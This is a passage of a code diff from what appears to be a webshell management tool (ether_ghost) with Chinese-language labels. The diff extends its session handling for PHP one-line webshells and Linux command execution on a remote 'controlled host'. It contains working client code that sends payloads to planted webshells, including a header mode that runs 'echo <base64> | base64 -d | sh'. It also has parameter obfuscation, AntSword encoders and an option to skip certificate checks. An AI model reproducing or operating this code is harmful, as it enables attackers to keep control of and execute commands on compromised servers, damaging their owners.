++            return todecode
++        else:
++            raise exceptions.UserError("未知Decoder: " + self.decoder)
+ 
+     async def submit_http(self, payload: t.Union[str, bytes]):
+         try:
++            kwargs = {
++                "params": self.params.copy(),
++                "headers": {"Connection": "close"},
++                "data": self.data.copy(),
++            }
++            if self.password_method in ["GET", "HEAD"]:
++                kwargs["params"][self.password] = payload
++            elif self.password_method == "HEADER":
++                if isinstance(payload, bytes):
++                    payload_b64 = base64.b64encode(payload).decode()
++                else:
++                    payload_b64 = base64.b64encode(payload.encode()).decode()
++                kwargs["headers"][
++                    self.password
++                ] = f"echo {payload_b64} | base64 -d | sh"
++            else:
++                kwargs["data"][self.password] = payload
+             response = await self.client.request(
+-                method="POST", url=self.url, data={self.password: payload}
++                method=(
++                    "POST" if self.password_method == "HEADER" else self.password_method
++                ),
++                url=self.url,
++                **kwargs,
+             )
+             return response.status_code, response.text
+         except httpx.TimeoutException as exc:
+             raise exceptions.NetworkError("HTTP请求受控端超时") from exc
+         except httpx.HTTPError as exc:
+-            raise exceptions.NetworkError("发送HTTP请求到受控端失败") from exc
++            raise exceptions.NetworkError(
++                "发送HTTP请求到受控端失败：" + str(exc)
++            ) from exc
++
++
++import uuid
++from ..session_connector import DirectSessionConnector, register_direct_connector
++from .linux_cmd_oneliner import LinuxCmdOneLiner
++
++
++@register_direct_connector
++class LinuxCmdOneLinerConnector(DirectSessionConnector):
++    connector_name = "LINUX_CMD_ONELINER"
++    connector_name_readable = "Linux命令执行"
++    session_class = LinuxCmdOneLiner
++    options = LinuxCmdOneLiner.conn_options
++
++    def get_session_type(self) -> str:
++        return self.session_class.session_type
++
++    def build_session(self, config: dict):
++        return self.session_class(config)
++
++    async def close_session(self, config: dict):
++        pass
+diff --git a/ether_ghost/sessions/php_oneliner.py b/ether_ghost/sessions/php_oneliner.py
+index 9a2e95d..729406a 100644
+--- a/ether_ghost/sessions/php_oneliner.py
++++ b/ether_ghost/sessions/php_oneliner.py
+@@ -11,13 +11,14 @@ import httpx
+ from ..core import exceptions
+ 
+ from ..utils.random_data import random_english_words, random_data
++from ..utils.tools import user_json_loads
+ from ..utils import const
+ from ..utils.nodejs_bridge import nodejs_eval
+ from ..core.base import (
+     register_session,
+-    ConnOption,
+-    ConnOptionGroup,
+-    ConnOptionAlternative,
++    Option,
++    OptionGroup,
++    OptionAlternative,
+     get_http_client,
+ )
+ from ..core.php_session_common import (
+@@ -36,7 +37,7 @@ logger = logging.getLogger("core.sessions.php_oneline")
+ # 这样至少可以避免游魂启动后被反制
+ 
+ antsword_encoders = [file.name for file in const.ANTSWORD_ENCODER_FOLDER.glob("*.js")]
+-antsword_encoders_alternatives: t.List[ConnOptionAlternative] = [
++antsword_encoders_alternatives: t.List[OptionAlternative] = [
+     {"name": filename, "value": filename} for filename in antsword_encoders
+ ]
+ 
+@@ -59,19 +60,6 @@ def add_obfs_data(data: t.Dict[str, t.Any], min_count, max_count):
+     return result
+ 
+ 
+-def user_json_loads(data: str, types: t.Union[type, t.Iterable[type]]):
+-    if not isinstance(types, type):
+-        types = tuple(types)
+-    try:
+-        parsed = json.loads(data)
+-        if not isinstance(parsed, types):
+-            raise exceptions.UserError(
+-                f"无效的JSON数据：需要的数据类型为{types}，输入的是{type(parsed)}，数据为{parsed!r}"
+-            )
+-        return parsed
+-    except json.JSONDecodeError as exc:
+-        raise exceptions.UserError(f"解码JSON失败: {data!r}") from exc
+-
+ 
+ def eval_antsword_encoder(filename: str, pwd: str, php_payload) -> dict:
+     if shutil.which("node") is None:
+@@ -90,17 +78,16 @@ def eval_antsword_encoder(filename: str, pwd: str, php_payload) -> dict:
+     return json.loads(nodejs_eval(code, [pwd, json.dumps(data)]))
+ 
+ 
+-@register_session
+ class PHPWebshellOneliner(PHPWebshellCommunication, PHPWebshellActions):
+     """一句话的php webshell"""
+ 
+     session_type = "ONELINE_PHP"
+     readable_name = "PHP一句话"
+-    conn_options: t.List[ConnOptionGroup] = [
++    conn_options: t.List[OptionGroup] = [  # type: ignore
+         {
+             "name": "基本连接配置",
+             "options": [
+-                ConnOption(
++                Option(
+                     id="url",
+                     name="地址",
+                     type="text",
+@@ -108,7 +95,7 @@ class PHPWebshellOneliner(PHPWebshellCommunication, PHPWebshellActions):
+                     default_value=None,
+                     alternatives=None,
+                 ),
+-                ConnOption(
++                Option(
+                     id="password_method",
+                     name="密码传参方式",
+                     type="select",
+@@ -119,7 +106,7 @@ class PHPWebshellOneliner(PHPWebshellCommunication, PHPWebshellActions):
+                         {"name": "GET", "value": "GET"},
+                     ],
+                 ),
+-                ConnOption(
++                Option(
+                     id="password",
+                     name="密码",
+                     type="text",
+@@ -132,7 +119,7 @@ class PHPWebshellOneliner(PHPWebshellCommunication, PHPWebshellActions):
+         {
+             "name": "高级连接配置",
+             "options": [
+-                ConnOption(
++                Option(
+                     id="http_params_obfs",
+                     name="HTTP POST参数混淆",
+                     type="checkbox",
+@@ -140,7 +127,7 @@ class PHPWebshellOneliner(PHPWebshellCommunication, PHPWebshellActions):
+                     default_value=True,
+                     alternatives=None,
+                 ),
+-                ConnOption(
++                Option(
+                     id="timeout_refresh_client",
+                     name="超时更换HTTP Session",
+                     type="checkbox",
+@@ -148,7 +135,7 @@ class PHPWebshellOneliner(PHPWebshellCommunication, PHPWebshellActions):
+                     default_value=False,
+                     alternatives=None,
+                 ),
+-                ConnOption(
++                Option(
+                     id="chunked_request",
+                     name="分块传输编码",
+                     type="text",
+@@ -156,7 +143,7 @@ class PHPWebshellOneliner(PHPWebshellCommunication, PHPWebshellActions):
+                     default_value="0",
+                     alternatives=None,
+                 ),
+-                ConnOption(
++                Option(
+                     id="antsword_encoder",
+                     name="蚁剑编码器",
+                     type="select",
+@@ -174,7 +161,7 @@ class PHPWebshellOneliner(PHPWebshellCommunication, PHPWebshellActions):
+         {
+             "name": "自定义HTTP参数",
+             "options": [
+-                ConnOption(
++                Option(
+                     id="http_request_method",
+                     name="自定义HTTP请求方法",
+                     type="text",
+@@ -182,7 +169,7 @@ class PHPWebshellOneliner(PHPWebshellCommunication, PHPWebshellActions):
+                     default_value="",
+                     alternatives=None,
+                 ),
+-                ConnOption(
++                Option(
+                     id="extra_get_params",
+                     name="额外的GET参数",
+                     type="text",
+@@ -190,7 +177,7 @@ class PHPWebshellOneliner(PHPWebshellCommunication, PHPWebshellActions):
+                     default_value="{}",
+                     alternatives=None,
+                 ),
+-                ConnOption(
++                Option(
+                     id="extra_post_params",
+                     name="额外的POST参数",
+                     type="text",
+@@ -198,7 +185,7 @@ class PHPWebshellOneliner(PHPWebshellCommunication, PHPWebshellActions):
+                     default_value="{}",
+                     alternatives=None,
+                 ),
+-                ConnOption(
++                Option(
+                     id="extra_headers",
+                     name="额外的headers",
+                     type="text",
+@@ -206,7 +193,7 @@ class PHPWebshellOneliner(PHPWebshellCommunication, PHPWebshellActions):
+                     default_value="{}",
+                     alternatives=None,
+                 ),
+-                ConnOption(
++                Option(
+                     id="extra_cookies",
+                     name="额外的cookies",
+                     type="text",
+@@ -214,7 +201,7 @@ class PHPWebshellOneliner(PHPWebshellCommunication, PHPWebshellActions):
+                     default_value="{}",
+                     alternatives=None,
+                 ),
+-                ConnOption(
++                Option(
+                     id="https_verify",
+                     name="验证HTTPS证书",
+                     type="checkbox",
+@@ -222,7 +209,7 @@ class PHPWebshellOneliner(PHPWebshellCommunication, PHPWebshellActions):
+                     default_value=False,
+                     alternatives=None,
+                 ),
+-                ConnOption(
++                Option(
+                     id="timeout",
+                     name="HTTP连接超时",
+                     type="text",
+@@ -356,4 +343,23 @@ class PHPWebshellOneliner(PHPWebshellCommunication, PHPWebshellActions):
+         except httpx.ProxyError as exc:
+             raise exceptions.NetworkError("连接代理失败") from exc
+         except httpx.HTTPError as exc:
+-            raise exceptions.NetworkError("发送HTTP请求到受控端失败") from exc
++            raise exceptions.NetworkError("发送HTTP请求到受控端失败：" + str(exc)) from exc
++
++import uuid
++from ..session_connector import DirectSessionConnector, register_direct_connector
++
++@register_direct_connector
++class PHPOnelinerConnector(DirectSessionConnector):
++    connector_name = "ONELINE_PHP"
++    connector_name_readable = "PHP一句话"
++    session_class = PHPWebshellOneliner
++    options = PHPWebshellOneliner.conn_options
++
++    def get_session_type(self) -> str:
++        return self.session_class.session_type
++
++    def build_session(self, config: dict):
++        return self.session_class(config)
++
++    async def close_session(self, config: dict):
++        pass
